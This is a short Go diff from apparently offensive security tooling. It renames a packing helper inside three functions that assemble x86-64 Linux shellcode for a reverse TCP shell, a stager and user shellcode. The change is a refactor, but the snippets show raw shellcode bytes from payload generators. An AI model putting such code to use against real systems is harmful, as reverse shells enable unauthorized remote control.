@@ -19,7 +19,7 @@ func reverse_tcp_shell_linux_intel_64(params api.Parameters) ([]byte, error) {
 	//64bit shellcode
 	shellcode1 := "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c"
 	shellcode1 += "\x48\xBD"
-	if as, err := api.PackAddr64(entry); err == nil {
+	if as, err := api.PackUint64(entry); err == nil {
 		shellcode1 += as
 	} else {
 		return nil, err
@@ -56,7 +56,7 @@ func reverse_tcp_stager_linux_intel_64(params api.Parameters) ([]byte, error) {
 	//64bit shellcode
 	shellcode1 := "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c"
 	shellcode1 += "\x48\xBD"
-	if as, err := api.PackAddr64(entry); err == nil {
+	if as, err := api.PackUint64(entry); err == nil {
 		shellcode1 += as
 	} else {
 		return nil, err
@@ -84,7 +84,7 @@ func user_shellcode_linux_intel_64(params api.Parameters) ([]byte, error) {
 	//64bit shellcode
 	shellcode1 := "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c"
 	shellcode1 += "\x48\xBD"
-	if as, err := api.PackAddr64(entry); err == nil {
+	if as, err := api.PackUint64(entry); err == nil {
 		shellcode1 += as
 	} else {
 		return nil, err
